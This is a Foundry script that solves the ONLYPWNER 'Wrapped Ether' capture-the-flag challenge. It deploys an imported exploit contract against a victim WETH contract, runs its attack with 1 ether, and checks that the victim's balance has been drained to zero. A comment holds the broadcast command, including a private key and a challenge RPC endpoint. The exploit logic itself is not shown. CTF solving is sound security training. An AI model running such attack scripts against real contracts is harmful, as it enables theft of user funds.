// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script } from "@dev/forge-std/Script.sol";
import { console2 } from "@dev/forge-std/console2.sol";
import { WrappedEther, WrappedEtherExploit } from "@contracts/CTF/ONLYPWNER/05.WRAPPED-ETHER.sol";

/*

forge script \
    foundry/script/CTF/ONLYPWNER/05.WRAPPED-ETHER.s.sol:WRAPPED_ETHER_05_Exploit \
    --private-key be0a5d9f38057fa406c987fd1926f7bfc49f094dc4e138fc740665d179e6a56a \
    --with-gas-price 0 \
    -vvvv \
    --rpc-url https://nodes.onlypwner.xyz/rpc/894fd86c-c04b-49c2-8650-78eb4ba7aaf6 \
    --broadcast

*/

contract WRAPPED_ETHER_05_Exploit is Script {
    WrappedEther private victimInstance;
    WrappedEtherExploit private exploitInstance;
    address attackerAddress = address(0x34788137367a14f2C4D253F9a6653A93adf2D234);

    function run() public {
        victimInstance = WrappedEther(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
        vm.startBroadcast();

        // Attack
        WrappedEtherExploit hackInst = new WrappedEtherExploit(address(victimInstance));
        hackInst.attack{ value: 1 ether }();

        vm.stopBroadcast();
        _check();
    }

    function _check() public view {
        require(address(victimInstance).balance == 0, "Not solved: WETH have ether");
    }
}
